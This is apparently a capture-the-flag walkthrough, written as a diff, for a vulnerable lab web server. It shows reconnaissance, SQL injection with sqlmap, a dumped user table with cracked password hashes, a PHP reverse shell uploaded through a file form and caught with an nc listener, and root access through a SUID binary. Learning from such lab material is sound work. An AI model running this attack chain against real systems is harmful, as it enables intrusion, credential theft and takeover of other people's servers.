@@ -1,0 +1,81 @@
+$ netdiscover -i wlp2s0
+
+192.168.1.8
+
+
+$ nmap -sV 192.168.1.8 -p- -Pn -T5
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.34 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+$ dirb http://192.168.1.8/
+---- Scanning URL: http://192.168.1.8/ ----                                    │
++ http://192.168.1.8/index.php (CODE:200|SIZE:100)                             │
++ http://192.168.1.8/server-status (CODE:403|SIZE:299)                         │
+==> DIRECTORY: http://192.168.1.8/uploads/      
+
+
+go to http://192.168.1.8/login.php and register for a new user , 
+then use this user's credentials to login. It will redirect to welcome.php
+page. this page search from the database a given title of a book. 
+
+lets see if it is vulnearble to sqli. I will use sqlmap. Since it is a POST
+method I will intercept the request with burp and copy the request in a file
+called request.txt
+
+$ sqlmap -r request.txt -p search
+-p parameter indicates the parameter we are attacking
+
+$ sqlmap -r request.txt -p search --dbs
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] webapphacking
+
+
+$ sqlmap -r request.txt -p search -D webapphacking -T users --dump
+
++----+--------------+------------+----------------------------------+----------------+
+| id | name         | user       | pasword                          | address        |  password cracked
++----+--------------+------------+----------------------------------+----------------+	
+| 1  | David        | user1      | 5d41402abc4b2a76b9719d911017c592 | Newton Circles | 	hello
+| 2  | Beckham      | user2      | 6269c4f71a55b24bad0f0267d9be5508 | Kensington     |	commando
+| 3  | anonymous    | user3      | 0f359740bd1cda994f8b55330c86d845 | anonymous      |	p@ssw0rd
+| 10 | testismyname | test       | 05a671c66aefea124cc08b76ea6d30bb | testaddress    |	testtest
+| 11 | superadmin   | superadmin | 2386acb2cf356944177746fc92523983 | superadmin     |	Uncrackable
+| 12 | test1        | test1      | 05a671c66aefea124cc08b76ea6d30bb | test1          |	testtest
+| 13 | <blank>      | cihan      | c65bf039af36f349bbaf9b1dc553250d | <blank>        |
++----+--------------+------------+----------------------------------+----------------+
+
+
+now login as superadmin. Using his credentials.
+
+wen we login as superadmin there is a file upload form . Downaload pentest monkey's reverse shell and upload it .
+
+Then set up a listener on localhost
+
+$ nc -lnvp 4444
+and go to /uploads/shell.php folder and get the reverse shell.
+
+go to /home/legacy directory
+
+there is a file named touchmenot
+-rwsr--r-x 1 root root 8472 Mar 26  2019 touchmenot
+that has suid bit set up.
+
+we can execute this file
+
+$ ./touchmenot
+$ whoami 
+root
+
+
+
+
+
+
+
